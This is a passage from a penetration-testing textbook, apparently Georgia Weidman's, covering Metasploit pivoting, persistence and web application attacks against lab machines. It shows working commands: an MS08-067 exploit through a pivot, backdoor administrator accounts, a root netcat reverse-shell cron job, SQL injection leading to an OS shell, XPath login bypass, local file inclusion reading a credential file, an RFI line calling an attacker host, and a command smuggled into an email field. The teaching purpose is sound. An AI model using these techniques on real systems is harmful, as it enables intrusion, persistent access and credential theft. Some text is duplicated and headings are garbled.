but I have performed penetration tests for clients who have Internet-facing systems as 
part of their internal domain. All I had to do was exploit their web application, which 
had a default password for the administrative account, and upload a PHP shell as we 
did to XAMPP in Chapter 8, and suddenly I had access to a system on their internal 
domain. Hopefully, most of your clients will require a few more steps between piercing 
the perimeter and domain access. 
When we set up our Windows 7 target in Chapter 1, we gave it two virtual 
network adapters. We connected one to the bridged network where it could 
talk to the other targets and our Kali virtual machine. The other virtual 
adapter is connected to the host-only network. For this exercise, switch the 
Windows XP target to the host-only network so it is no longer accessible by 
the Kali system. (For more information on changing virtual network settings, 
see ‚ÄúCreating the Windows 7 Target‚Äù on page 48.)
Though this is a Windows system, Meterpreter allows us to use the 
ifconfig command to see networking information. As shown in Listing 13-28, 
the Windows 7 target is part of two networks: the 192.168.20.0/24 network, 
which also includes our Kali system, and the 172.16.85.0/24 network, which 
our Kali system does not have access to. 
meterpreter > ifconfig
Interface 11
============
Name : Intel(R) PRO/1000 MT Network Connection
Hardware MAC : 00:0c:29:62:d5:c8
MTU : 1500
IPv4 Address : 192.168.20.12
Post Exploitation 305
IPv4 Netmask : 255.255.255.0
Interface 23
============
Name : Intel(R) PRO/1000 MT Network Connection #2
Hardware MAC : 00:0c:29:62:d5:d2
MTU : 1500
IPv4 Address : 172.16.85.191
IPv4 Netmask : 255.255.255.0
Listing 13-28: Dual-homed system networking information 
We can‚Äôt attack any systems in the 172.16.85.0 network directly from 
Kali. However, because we have access to the Windows 7 target, we can use 
it as a jumping-off point, or pivot, to further explore this second network, as 
shown in Figure 13-3. 
Kali
192.168.20.9
Windows 7
192.168.20.12
172.16.85.191
Windows XP
172.16.85.190
Figure 13-3: Pivoting through an exploited system 
At this point we could start uploading our hack tools to the Windows 7 
target to begin the penetration test on the 172.16.85.0 network, but that 
attempt would likely be caught by antivirus software, and we‚Äôd have to clean 
up the mess left behind. Metasploit gives us another option: We can route 
all of the traffic for our target network through an open Metasploit session. 
Adding a Route in Metasploit 
The route command in Metasploit tells Metasploit where to route traffic. 
Instead of routing traffic to an IP address, we send traffic destined for a network through a specific open session. In this case, we want to send all traffic headed to the 172.16.85.0 network through the Windows 7 session. The 
syntax for the route command in Metasploit is route add network <subnet mask> 
<session id>.
msf > route add 172.16.85.0 255.255.255.0 2
306 Chapter 13
Now any traffic we send from Metasploit to the 172.16.85.0 network will 
automatically be routed through the Windows 7 session (session 2 in my 
case). We can set options such as RHOST or RHOSTS to systems in this network, 
and Metasploit will get traffic to the right place. 
Metasploit Port Scanners
One of the first things we did when information gathering in Chapter 5 was 
to port scan our targets with Nmap. We won‚Äôt be able to use external tools 
with our Metasploit route, but luckily Metasploit has some port-scanning 
modules we can use instead, like the scanner/portscan/tcp module, which will 
perform a simple TCP port scan, as shown in Listing 13-29. 
msf > use scanner/portscan/tcp
msf auxiliary(tcp) > show options
Module options (auxiliary/scanner/portscan/tcp):
 Name Current Setting Required Description
 ---- --------------- -------- -----------
 CONCURRENCY 10 yes The number of concurrent ports to check per host
 PORTS u1-10000 yes Ports to scan (e.g. 22-25,80,110-900)
 RHOSTS yes The target address range or CIDR identifier
 THREADS 1 yes The number of concurrent threads
 TIMEOUT 1000 yes The socket connect timeout in milliseconds
msf auxiliary(tcp) > set RHOSTS 172.16.85.190
rhosts => 172.16.85.190
msf auxiliary(tcp) > exploit
[*] 172.16.85.190:25 - TCP OPEN
[*] 172.16.85.190:80 - TCP OPEN
[*] 172.16.85.190:139 - TCP OPEN
[*] 172.16.85.190:135 - TCP OPEN
[*] 172.16.85.190:180 - TCP OPEN
--snip--
Listing 13-29: Port scanning with Metasploit
Set the RHOSTS option as usual for auxiliary modules. By default Metasploit 
scans port 1-10000 u, though you can change this option if you wish. 
Though Metasploit‚Äôs port scanners are not as powerful as Nmap‚Äôs, we 
can at least see that the SMB port is open. From here we might run the 
auxiliary/scanner/smb/smb_version module followed by the check function with 
the windows/smb/ms08_067_netapi module to lead us toward exploiting the 
Windows XP target with the MS08-067 exploit through a pivot. 
Running an Exploit through a Pivot
Because our Windows XP and Kali systems are on different networks, a 
reverse payload won‚Äôt work for our exploit because the Windows XP target 
won‚Äôt know how to route traffic back to 192.168.20.9. (Of course, if our Kali 
system was on the Internet and the internal network we are attacking could 
route to the Internet, that would not be the case. However, here our hostonly network does not know how to route to our bridged network.) Instead, 
Post Exploitation 307
we‚Äôll use a bind payload. Metasploit‚Äôs bind handler will have no trouble routing through the pivot we set up. The windows/meterpreter/bind_tcp payload 
will work as shown in Listing 13-30. 
msf exploit(handler) > use windows/smb/ms08_067_netapi
msf exploit(ms08_067_netapi) > set RHOST 172.16.85.190
RHOST => 172.16.85.190
msf exploit(ms08_067_netapi) > set payload windows/meterpreter/bind_tcp
payload => windows/meterpreter/bind_tcp
msf exploit(ms08_067_netapi) > exploit
Listing 13-30: Exploiting through a pivot
We‚Äôve gotten another session, this time through a pivot. 
Socks4a and ProxyChains 
Pivoting through Metasploit is all well and good, but we‚Äôre limited to using 
Metasploit modules. Perhaps there is a way to proxy other tools through 
Metasploit‚Äôs pivot? In fact there is: using the ProxyChains tool (which 
redirects traffic to proxy servers) to send our traffic from other Kali tools 
through Metasploit. 
But first we need to set up a proxy server in Metasploit. Like the SMB 
server module we used to capture NETLM and NETNTLM hashes earlier in this chapter, Metasploit also has a Socks4a proxy server module 
(auxiliary/server/socks4a). Listing 13-31 shows how to set up the proxy 
server.
msf > use auxiliary/server/socks4a 
msf auxiliary(socks4a) > show options
Module options (auxiliary/server/socks4a):
 Name Current Setting Required Description
 ---- --------------- -------- -----------
 SRVHOST 0.0.0.0 yes The address to listen on
 SRVPORT 1080 yes The port to listen on.
msf auxiliary(socks4a) > exploit
[*] Auxiliary module execution completed
[*] Starting the socks4a proxy server
Listing 13-31: Setting up a Socks4a proxy server in Metasploit
Leave the options as the defaults, but note that the server will be listening on port 1080. 
Now we need to edit the configuration file for ProxyChains at /etc/
proxychains.conf. Scroll down to the bottom of the file in an editor, and you 
should see that by default, ProxyChains is set to route traffic to the Tor network as shown here.
308 Chapter 13
# add proxy here ...
# defaults set to ‚Äútor‚Äù
socks4 127.0.0.1 9050
We need to change the proxy value to Metasploit‚Äôs listening server. 
Replace port 9050 (for Tor) with 1080 (for Metasploit). The line should 
now read:
socks4 127.0.0.1 1080
Save the configuration file for ProxyChains. Now we can run tools like 
Nmap from outside Metasploit against our Windows XP target, as long as we 
preface them with proxychains as shown in Listing 13-32. (The Metasploit 
route must still be active because ProxyChains simply redirects the traffic 
to Metasploit, which will forward the traffic through the pivot.) 
root@kali:~# proxychains nmap -Pn -sT -sV -p 445,446 172.16.85.190
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 6.40 ( http://nmap.org ) at 2015-03-25 15:00 EDT
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.85.190.165:445-<><>-OKu
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.85.190:446-<--deniedv
Nmap scan report for 172.16.85.190
Host is up (0.32s latency).
PORT STATE SERVICE VERSION
445/tcp open microsoft-ds Microsoft Windows XP microsoft-ds
446/tcp closed ddm-rdb
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Listing 13-32: Running Nmap through ProxyChains 
Listing 13-32 shows Nmap being run against the Windows XP host 
through the pivot with ProxyChains. The option -Pn tells Nmap not to try 
to ping through the proxy. We start with a simple TCP connect scan (-sT) 
and then run a version scan (-sV). For the sake of simplicity, I‚Äôve limited the 
ports to 445 and 446 with the -p option. We see that the connection is OK on 
port 445 u but denied on port 446 v. This makes sense because the SMB 
server is running on port 445, but nothing is running on port 446. (If any 
of this is unfamiliar, see ‚ÄúPort Scanning with Nmap‚Äù on page 125.)
This is just one way to run tools external to Metasploit through a pivot. 
While doing so does slow things down a bit, it can be quite useful to have 
access to other tools in Kali. 
N ote Not all vulnerabilities will be exploitable through a pivot. In general, it depends on
how the vulnerable protocols work. Another technique to look into is SSH tunneling. 
See my blog at http://www.bulbsecurity.com/ for more information. 
Post Exploitation 309
Persistence 
A great thing about our Meterpreter sessions is also a bad thing. Because 
the host process resides entirely in memory, if it dies, our Meterpreter session dies as well, and if the system restarts we lose our session. If we lose 
network access to the target, our session may die as well. 
Rather than re-exploiting the same vulnerability or resending socialengineering attacks, it would be ideal if we had a way to regain access in the 
future. Persistence methods can be as simple as adding a user to a system or 
as advanced as kernel-level rootkit that hides itself even from the Windows 
API making it virtually undetectable. In this section we‚Äôll look at a few simple 
ways to gain persistence on a target system to give you a good starting point 
for your pentests. 
Adding a User
Perhaps the simplest way to gain persistence is to add a new user. Being able 
to log in to the system directly via SSH, RDP, and so on makes it easy to access 
a system in the future. (As with all other changes you make on your targets, 
remember to delete any added user accounts before finishing the pentest.) 
On a Windows system, use net user username password /add to add a new 
user, as shown here. 
C:\Documents and Settings\georgia\Desktop> net user james password /add
net user james password /add
The command completed successfully.
We should also add our new user to the relevant groups with the command net localgroup group username /add. For example, if we want to log in 
via remote desktop, we should add the user to the Remote Desktop Users 
group. The Administrators group is also a good group to add our user to as 
shown here. 
C:\Documents and Settings\georgia\Desktop> net localgroup Administrators james /add
net localgroup Administrators james /add
The command completed successfully.
If your client has a Windows domain, you can add users to the domain 
and add them to domain groups (if you have sufficient privileges) by tacking on /domain at the end of a command. For example, if you are able to steal 
a domain administrator‚Äôs token, you can use the following commands to 
add a domain administrator account, giving you full control of the entire 
domain.
C:\Documents and Settings\georgia\Desktop> net user georgia2 password /add /domain
C:\Documents and Settings\georgia\Desktop> net group "Domain Admins" georgia2 /add /domain
On the Linux target, we can use adduser to add a user account. Ideally we 
should also add our new user to the sudoers group so we have root privileges.
310 Chapter 13
Metasploit Persistence 
The Meterpreter script persistence automates the creation of a Windows backdoor that will automatically connect back to a Metasploit listener at startup, 
login, and so on, based on the options we use when creating it. The options 
for the persistence script are shown in Listing 13-33. 
meterpreter > run persistence -h
Meterpreter Script for creating a persistent backdoor on a target host.
OPTIONS:
 -A Automatically start a matching multi/handler to connect to the agent
 -L <opt> Location in target host where to write payload to, if none %TEMP% will be used.
 -P <opt> Payload to use, default is windows/meterpreter/reverse_tcp.
 -S Automatically start the agent on boot as a service (with SYSTEM privileges)
 -T <opt> Alternate executable template to use
 -U Automatically start the agent when the User logs on
 -X Automatically start the agent when the system boots
 -h This help menu
 -i <opt> The interval in seconds between each connection attempt
 -p <opt> The port on the remote host where Metasploit is listening
 -r <opt> The IP of the system running Metasploit listening for the connect back
Listing 13-33: Meterpreter persistence script 
As you can see we have a lot of customization options for our persistent 
payload. We can have the persistence agent start at boot or when the user 
logs in. We can set an interval between attempts to connect to the handler. 
We can change where the agent is written on the target system. We can also 
specify the remote host and port for the agent to connect back to. We can 
even have Metasploit automatically set up a handler to catch the incoming connection. In the process of setting up persistence, Metasploit has to 
write the persistence agent to the disk, so Meterpreter is no longer completely residing in memory at this point. When the persistence agent runs at 
startup (-X), a Visual Basic script is uploaded to the %TEMP% folder, and 
a registry entry is added to the list of programs to run at startup. When the 
persistence agent runs upon login (-U), the process is similar, but the registry entry is set to run at login. When the persistence agent runs as a service 
(-S), a Windows system service is created that will call the Visual Basic script 
from %TEMP%. 
Let‚Äôs run the persistence script, as shown in Listing 13-34, telling the 
agent to connect back to our Kali machine when the user logs in.
meterpreter > run persistence -r 192.168.20.9 -p 2345 -U 
[*] Running Persistence Script
[*] Resource file for cleanup created at /root/.msf4/logs/persistence/BOOKXP_20150814.1154/
BOOKXP_20150814.1154.rc
[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345
[*] Persistent agent script is 614853 bytes long
[+] Persistent Script written to C:\WINDOWS\TEMP\eTuUwezJblFHz.vbs
[*] Executing script C:\WINDOWS\TEMP\eTuUwezJblFHz.vbs
Post Exploitation 311
[+] Agent executed with PID 840
[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\BJkGfQLhXD
[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\BJkGfQLhXD
Listing 13-34: Running the persistence script 
After running the script, place the Meterpreter session in the background with the Meterpreter command background, and set up a handler 
to catch the persistence agent. Now restart the Windows XP target. When 
it restarts, log in as georgia, and you should receive another Meterpreter 
session. 
note If it doesn‚Äôt work the first time, try restarting and logging in again.
Creating a Linux cron Job
On both Windows and Linux systems, we can automatically start tasks at 
a given time. For example, we can set up a cron job to automatically run a 
Metasploit payload or even just use Netcat to connect back to us. 
Open /etc/crontab on your Linux target. The following line will run the 
command nc 192.168.20.9 12345 -e /bin/bash every ten minutes of every hour 
of every day of every month‚Äîbasically every ten minutes. The command will 
be run as root. Add this line to the end of the /etc/crontab file. (For help, see 
‚ÄúAutomating Tasks with cron Jobs‚Äù on page 72.)
*/10 * * * * root nc 192.168.20.9 12345 -e /bin/bash
Now restart the cron service by entering service cron restart. Set up a 
Netcat listener on port 12345 on your Kali machine, and at the next tenminute mark, the cron job should run, and you should receive a root shell at 
your Netcat listener. 
Summary
In this chapter we‚Äôve covered just a few post-exploitation techniques, barely 
skimming the surface of the wealth of interesting tools and techniques 
available. We looked at some methods for escalating our privileges on an 
exploited system. We also looked at methods of gathering local information. We studied methods of turning access to one system into access to 
many, including pivoting from one network to another through an open 
session. Finally, we looked at a couple of methods for making our access 
permanent. 

14 
W eb Apl i c tion T
Though automated scanners are great at finding 
known vulnerabilities in web applications, many clients build custom web applications. Sure, commercial 
products can automate attacks against user input fields 
in custom web applications, but nothing can replace a 
good penetration tester with a proxy when it comes to 
finding security issues in these applications. 
Like all software, web applications may have issues when input is not 
properly sanitized. For example, when an application pulls data from a database based on certain user input, the application may expect specific input 
such as a username and password. If, instead, the user enters special input 
to create additional database queries, he or she may be able to steal data 
from the database, bypass authentication, or even execute commands on 
the underlying system. 
314 Chapter 14 
In this chapter we‚Äôll look at finding some common vulnerabilities in web 
applications using the example web application installed on the Windows 7 
target: a simple bookstore with several security issues frequently found in web 
applications. (See ‚ÄúInstalling Additional Software‚Äù on page 52 for installation instructions.)
Using Burp Proxy
We can use a proxy to capture requests and responses between our browser 
and the web application so we can see exactly what data is being transmitted. 
Kali Linux comes with the free version of Burp Suite, a testing platform for 
web applications that includes a proxy feature. Burp includes other useful 
components, such as Burp Spider, which can crawl through web application 
content and functionality, and Burp Repeater, which allows you to manipulate and resend requests to the server. For now, we‚Äôll focus on the Burp 
Proxy tab. 
To start Burp Suite in Kali Linux, go to Applications at the top left 
of the Kali GUI, and then click Kali LinuxÔÄ¥Web ApplicationsÔÄ¥We
Application FuzzersÔÄ¥burpsuite, as shown in Figure 14-1
Figure 14-1: Starting Burp Suite in Kali
Click the Proxy tab, as shown in Figure 14-2. By default, the Intercept 
is on button should be selected so that Burp Suite intercepts and traps any 
outgoing requests from a web browser configured to use Burp as a proxy 
for web traffic. This setting will allow us to see and even modify the details 
of web requests before they are sent to the server. 
Web Application Testing 315
Figure 14-2: Burp Proxy interface
Now we need to tell our browser in Kali Linux to proxy web traffic 
through Burp Suite. 
1. Open the Iceweasel browser, go to Edit4Preferences4Advanced, and 
select the Network tab.
2. Click Settings to the right of Connection. 
3. In the Connection Settings dialog, shown in Figure 14-3, select Manual 
proxy configuration, and enter the IP address 127.0.0.1 and port 8080. 
This tells Iceweasel to proxy traffic through the localhost on port 8080, 
the default port for Burp Proxy.
Figure 14-3: Setting a proxy in Iceweasel 
316 Chapter 14 
To ensure that Iceweasel will proxy all our traffic through Burp Suite, 
browse to the URL bookservice on your Windows 7 target: http://192.168.20.12/
bookservice. 
The connection should appear to hang in the browser, and the 
browser and Burp Suite should light up as the HTTP GET request for the 
main page of the bookservice site is captured by Burp Proxy, as shown in 
Figure 14-4.
Figure 14-4: Captured HTTP GET request 
We can see the details of the HTTP GET request asking the server for the 
bookservice web page. 
As we will see later, we can make changes to the request before sending 
it on to the server, but for now, let‚Äôs just go ahead and forward the request 
(and any subsequent ones) by clicking the Forward button. Returning to 
the browser, we see the server has sent us the main page of the bookservice 
site, as shown in Figure 14-5. 
Web Application Testing 317
Figure 14-5: Bookservice site 
Next let‚Äôs try signing up for an account (Figure 14-6). Click Login at 
the top left of the page, and then forward the request to the server from the 
proxy. Do the same to get to the Sign Up page by clicking New User and 
forwarding the request to the server. 
Figure 14-6: Signing up for a new account 
Enter a username, password, and email address, then submit the request 
by clicking Go. The request should be captured in Burp Proxy, as shown in 
Figure 14-7.
318 Chapter 14 
Figure 14-7: Captured request 
In addition to looking at the raw request, which is a bit unfriendly to 
read, you can click the Params tab at the top of the request window in Burp 
Suite to display the request parameters in a more readable format, as shown 
in Figure 14-8. 
Figure 14-8: Request parameters
Web Application Testing 319
For example, the new display shows the User field georgia, Pass field 
password, and Email field georgia@bulbsecurity.com. 
You can change these fields directly in the proxy. For example, if you 
change georgia‚Äôs password to password1 before forwarding the request to the 
server, the server will set the password for user georgia to password1, because 
the server never saw the original request from the browser requesting the 
password password. 
The proxy allows you to see the details of any request to the server. If 
at any point you don‚Äôt need to proxy traffic, click Intercept is on to toggle 
it to Intercept is off and allow traffic to pass through to the server without 
user interaction. Switch the button back on if you want to catch a particular 
request. 
SQL Injecti
Many web applications store data in a backend, SQL-based database. For 
example, we encountered a SQL database during our network penetration 
test, when we found an open MySQL database through phpMyAdmin in the 
XAMPP install on the Windows XP target on page 186. We then used a 
SQL query to write a simple PHP command shell to the web server. 
We typically won‚Äôt have direct access to run SQL queries on a site‚Äôs 
backend database from a web application. However, if a developer fails to 
sanitize user input when interacting with the database, you may find that 
you can perform a SQL injection attack to manipulate the queries sent to it. 
Successful SQL injection attacks can read data from the database, modify 
data, shut down or destroy the database, and, in some cases, even run commands on the underlying operating system (which can be especially powerful because database servers often run as privileged users). 
A natural place to look for SQL injection issues is in the login page. 
Many web applications store user data in a database, so we can use a SQL 
query to pull out the correct user, based on the username and password 
provided by the user. When developers don‚Äôt sanitize user input, we can 
build SQL queries to attack the database. An example of an injectable SQL 
statement that could be leveraged by an attacker is shown here:
SELECT id FROM users WHERE username='$username' AND password='$password';
What if an attacker supplied a username ' OR '1'='1 and the user‚Äôs password was ' OR '1'='1? The SQL statement turns into:
SELECT username FROM users WHERE username='' or '1'='1' AND password='' or '1'='1'
Because the OR '1'='1' will always be true, this SELECT statement will now 
return the first username in the user table, regardless of the username and 
password.
320 Chapter 14 
As we‚Äôll see in ‚ÄúXPath Injection‚Äù on page 323, our application uses 
Xpath, a query language for XML documents, which authenticates against 
an XML file rather than a database, though the injection process is similar. 
However, our application does use a SQL database to store records of the 
books available in the store, and when we select a book on the main page, 
its details are pulled from an MS SQL backend database. For example, 
click the More Details link for the first book on the site, Don‚Äôt Make Me 
Think. The URL requested is:
http://192.168.20.12/bookservice/bookdetail.aspx?id=1
The book‚Äôs details are filled in based on the results returned from the 
database query for the record with ID 1. 
Testing for SQL Injection Vulnerabilities
A typical first test for SQL injection vulnerabilities is to use a single quotation 
mark to close the SQL query. If a SQL injection vulnerability is present, the 
addition of that quotation mark should cause the application to throw a SQL 
error, because the query will already be closed as part of the underlying 
code and the extra single quote will cause the SQL syntax to be incorrect. 
That error will tell us that we can inject SQL queries to the site‚Äôs database 
using the id parameter. 
Let‚Äôs try this out by sending the query again with the id parameter to 1', 
as shown here.
http://192.168.20.12/bookservice/bookdetail.aspx?id=1'
As expected, the application serves an error page indicating that our 
SQL syntax is incorrect, as shown in Figure 14-9. 
Figure 14-9: The application identifies a SQL error. 
In particular, note the message ‚ÄúUnclosed quotation mark after the 
character string‚Äù in our SQL query. 
au: inserted space
in ‚Äúms sql‚Äù ‚Äì ok?
Web Application Testing 321
N ote Not all applications that are vulnerable to SQL injection will be so verbose with their
error messages. In fact, there is a whole class of blind SQL injection vulnerabilities, 
where error messages detailing the injection are not shown, even though the injection 
flaw is still present.
Exploiting SQL Injection Vulnerabilities
Now that we know a SQL injection vulnerability is present in this site, we 
can exploit it to run additional queries on the database that the developer 
never intended. For example, we can find out the name of the first database 
with the following query: 
http://192.168.20.12/bookservice/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(0))--
The query throws an error message, Conversion failed when converting the 
nvarchar value ‚ÄòBookApp‚Äô to data type int, which tells us that the name of the first 
database is BookApp, as shown in Figure 14-10.
Figure 14-10: Error message showing the database name 
Using SQLMap
We can also use tools to automatically generate SQL queries to perform various tasks on a site using SQL injection. All we need is an injection point; 
the tool does the rest. For example, Listing 14-1 shows how when we give a 
tool in Kali SQLMap a potentially injectable URL, SQLMap tests for SQL 
injection vulnerabilities and performs injection queries. 
root@kali:~# sqlmap -uu "http://192.168.20.12/bookservice/bookdetail.aspx?id=2" --dumpv
--snip--
[21:18:10] [INFO] GET parameter 'id' is 'Microsoft SQL Server/Sybase stacked queries' injectable 
--snip--
Database: BookApp
Table: dbo.BOOKMASTER
[9 entries]
+--------+---------------+-------+-------+-------------------------------------
As we‚Äôll see in ‚ÄúXPath Injection‚Äù on page 323, our application uses 
Xpath, a query language for XML documents, which authenticates against 
an XML file rather than a database, though the injection process is similar. 
However, our application does use a SQL database to store records of the 
books available in the store, and when we select a book on the main page, 
its details are pulled from an MS SQL backend database. For example, 
click the More Details link for the first book on the site, Don‚Äôt Make Me 
Think. The URL requested is:
http://192.168.20.12/bookservice/bookdetail.aspx?id=1
The book‚Äôs details are filled in based on the results returned from the 
database query for the record with ID 1. 
Testing for SQL Injection Vulnerabilities
A typical first test for SQL injection vulnerabilities is to use a single quotation 
mark to close the SQL query. If a SQL injection vulnerability is present, the 
addition of that quotation mark should cause the application to throw a SQL 
error, because the query will already be closed as part of the underlying 
code and the extra single quote will cause the SQL syntax to be incorrect. 
That error will tell us that we can inject SQL queries to the site‚Äôs database 
using the id parameter. 
Let‚Äôs try this out by sending the query again with the id parameter to 1', 
as shown here.
http://192.168.20.12/bookservice/bookdetail.aspx?id=1'
As expected, the application serves an error page indicating that our 
SQL syntax is incorrect, as shown in Figure 14-9. 
Figure 14-9: The application identifies a SQL error. 
In particular, note the message ‚ÄúUnclosed quotation mark after the 
character string‚Äù in our SQL query. 
au: inserted space
in ‚Äúms sql‚Äù ‚Äì ok?
322 Chapter 14 
| BOOKID | ISBN | PRICE | PAGES | PUBNAME | BOOKNAME 
| FILENAME | AUTHNAME | DESCRIPTION 
 
 
|
+--------+---------------+-------+-------+-------------------------------------
| 1 | 9780470412343 | 11.33 | 140 | Que; 1st edition (October 23, 2000) | Do not Make 
Me Think A Common Sense Approach to Web Usability | 
4189W8B2NXL.jpg | Steve Krug and Roger Black | All of the tips, techniques, and examples 
presented revolve around users being able to surf merrily through a well-designed site 
with minimal cognitive strain. Readers will quickly come to agree with many of the books 
assumptions, such as We do not read pages--we scan them and We do not figure out how things 
work--we muddle through. Coming to grips with such hard facts sets the stage for Web design 
that then produces topnotch sites. |
--snip-- |
Listing 14-1: Dumping the database with SQLMap
Specify the URL to test with -u option u. The --dump option v dumps 
the contents of the database‚Äîin this case, details of the books. 
We can also use SQLMap to try to get command-shell access on the 
underlying system. MS SQL databases contain a stored procedure called 
xp_cmdshell, which will give us command-shell access, but it‚Äôs often disabled. 
Luckily, SQLMap will try to reenable it. Listing 14-2 shows how we can get 
a command shell on the site‚Äôs underlying Windows 7 target system using 
SQLMap. 
root@kali:~# sqlmap -u "http://192.168.20.12/bookservice/bookdetail.aspx?id=2" --os-shell
--snip--
xp_cmdshell extended procedure does not seem to be available. Do you want sqlmap to try to 
re-enable it? [Y/n] Y
--snip--
os-shell> whoami
do you want to retrieve the command standard output? [Y/n/a] Y
command standard output: 'nt authority\system'
Listing 14-2: xp_cmdshell access through SQL injection
As you can see in Listing 14-2, we receive a shell running as System without having to guess credentials for the database. 
N ote The MS SQL database is not listening on a port anyway, so we can‚Äôt access it directly.
Unlike our Windows XP system in Chapter 6, this web server lacks phpMyAdmin, so 
we have no other way to access the database. A SQL injection issue in the hosted website gives us full system access. 
Web Application Testing 323
XPath Injecti
As mentioned previously, this bookservice application uses XML authentication, in which the XML is queried using Xpath. We can use XPath 
injection to attack XML. Though its syntax differs from SQL, the injection 
process is similar. 
For example, try entering single quotes (') for both the username and 
password fields at the login page. You should receive an error like the one 
shown in Figure 14-11. 
Figure 14-11: XML error at login 
As you can see from the error message shown in Figure 14-11, we again 
have an injection issue because we have an error in our syntax. Because 
we are at a login page, a typical injection strategy for Xpath would be to 
attempt to bypass authentication and gain access to the authenticated portion of the application by attacking the Xpath query logic. 
For example, as shown in the error details, the login query grabs the 
username and password provided, and then compares the values provided 
against credentials in an XML file. Can we create a query to bypass the 
need for valid credentials? Enter a set of dummy credentials at login, and 
capture the request with Burp Proxy, as shown in Figure 14-12.
Now change the txtUser and txtPass parameters in the captured request 
to this value. 
' or '1'='1
324 Chapter 14 
Figure 14-12: Captured login request 
This tells the login Xpath query to find the user account where the 
username and password field is blank or 1=1. Because 1=1 always evaluates 
as true, the logic of this query says to return the user where the username 
is blank or present‚Äîlikewise with the password. Thus using this injection 
method, we can get the application to log us in as the first user in the authentication file. And, as shown in Figure 14-13, we are logged in as the user Mike.
Figure 14-13: Authentication bypass through Xpath injection 
Local File Inclusio
Another vulnerability commonly found in web applications is local file inclusion, which is the ability to read files from the application or the rest of the 
filesystem that we should not have access to through the web app. We saw an 
example of this in Chapter 8 where the Zervit web server on the Windows XP 
target allowed us to download files from the target, such as a backup of the 
SAM and SYSTEM hives. 
Our bookservice app also suffers from local file inclusion. As user Mike, 
go to Profile4View Newsletters. Click the first newsletter in the list to view 
the contents of the file, as shown in Figure 14-14.
Web Application Testing 325
Figure 14-14: Viewing a newsletter
Now resend the request, and capture it with Burp Proxy, as shown in 
Figure 14-15. 
Figure 14-15: Captured newsletter request 
Click the Params tab, and note the parameter c:\inetpub\wwwroot\Book\
NewsLetter\Mike@Mike.com\Web Hacking Review.txt. The path c:\inetpub\wwwroot\
Book\NewsLetter\Mike suggests that the newsletter functionality is pulling the 
newsletters from the local filesystem by their absolute path. It also looks like 
there‚Äôs a folder called Mike@Mike.com in the Newsletter folder. Perhaps each 
user subscribed to the newsletters has such as folder. 
It also seems as if our application is actually at the path c:\inetpub\
wwwroot\Book, as noted in the newsletter requests, instead of c:\inetpub\
wwwroot\bookservice as we might expect from the URL. We note this 
because it may come in handy later on. 
326 Chapter 14 
What if we change the filename parameter to another file in the web 
application? Can we gain access to the app‚Äôs full source code? For example, 
change the file to the following, and forward the request to the server. 
C:\inetpub\wwwroot\Book\Search.aspx
As you can see, the source 
code of the Search.aspx page 
is displayed in the Newsletter 
box, as shown in Figure 14-16. 
Having access to the full 
server-side source code of the 
web application allows us to do 
a complete source code review 
to look for issues. 
But perhaps we can access 
even more sensitive data. For 
example, we know that the 
usernames and passwords are 
stored in an XML file. Perhaps 
we can request this file. We 
don‚Äôt know its name, but a few 
guesses for common filenames 
in XML authentication scenarios will lead us to the filename AuthInfo.xml. Capture the newsletter request 
in Burp Proxy, and change the requested file to the one shown here. 
C:\inetpub\wwwroot\Book\AuthInfo.xml
As you can see in Figure 
14-17, we now have access to 
the usernames and passwords 
in plaintext. Now we know why 
our previous Xpath injection 
logged us in as the user Mike: 
Mike is the first user in the file. 
This is a prime example 
of when using a proxy comes 
in handy. A user with just a 
browser would have been limited to only the files he or she 
could click on, namely the 
newsletters presented. On the 
other hand, with the proxy 
we are able to see the request 
ask for a specific file from the 
Figure 14-16: Local file inclusion vulnerability
Figure 14-17: Authentication info
Web Application Testing 327
filesystem. By changing the filename manually in the request using Burp 
Proxy, we were able to see other sensitive files. No doubt the developer did 
not consider the possibility that the user could just ask for any file and, 
thus, did not think to limit the files that could be accessed through the 
user‚Äôs newsletters. 
Worse still, we aren‚Äôt limited to files from the web application. We can 
load any file from the filesystem that the IIS_USER has read access to. For 
example, if you create a file called secret.txt on the C: drive, you can load it 
through the newsletters functionality. Just substitute the file you want in the 
request in Burp Suite. If we can find a way to upload files to a web application, we can even use LFI vulnerability to execute malicious code on the 
webserver.
Remote File Inclusi
Remote file inclusion (RFI) vulnerabilities allow attackers to load and 
execute malicious scripts, hosted elsewhere, on a vulnerable server. In 
Chapter 8, we used the open phpMyAdmin interface in XAMPP to write a 
simple PHP shell and finally a PHP version of Meterpreter to the web server. 
Though we are not uploading a file to the server here, the attack is similar. 
If we can trick the vulnerable server into executing a remote script, we can 
run commands on the underlying system. 
Our site does not have a remote file inclusion vulnerability, but simple 
vulnerable PHP code is shown here as an illustration.
<?php
include($_GET[‚Äòfile‚Äô]);
?>
An attacker can host a malicious PHP script (such as the meterpreter.php
script we used in Chapter 8) on their webserver and request the page with the 
file parameter set to http://<attacker_ip>/meterpreter.php. The RFI vulnerability 
would cause meterpreter.php to be executed by the webserver even though it is 
hosted elsewhere. Of course, our example application is ASP.net not PHP, but 
Msfvenom can create payloads in ASPX format for these sorts of apps.
Command Executio
As noted earlier, the Newsletters folder contains a folder called Mike@Mike
.com. Logically, this suggests that the site may contain similar folders with 
the email addresses of all users signed up to receive newsletters. Some part 
of the application must be creating these folders as users register or sign 
up for the newsletter. The application‚Äôs code is probably running a command to create the folders on the filesystem. Perhaps, again through lack of 
input validation, we can run additional commands that the developer never 
intended us to run. 
328 Chapter 14 
As shown in Figure 14-18, the bottom 
right of the web app contains a form to sign 
up for newsletters. We suspect that when we 
enter an email address, a folder is created for 
that email address in the newsletters folder. 
We guess that the email address input is 
fed to a system command to create a directory in the newsletters folder. If the developer 
does not properly sanitize user input, we may 
be able to run additional commands using 
the ampersand (&) symbol. 
We‚Äôll execute a command and send 
its output to a file in our application‚Äôs 
C:\inetpub\wwwroot\Book\ directory, then 
access the files directly to see the command‚Äôs 
output. Run the ipconfig command on the Windows 7 target as shown here 
to pipe the output from a system command such as ipconfig to the file test.txt
in the Book directory.
georgia@bulbsecurity.com & ipconfig > C:\inetpub\wwwroot\Book\test.txt
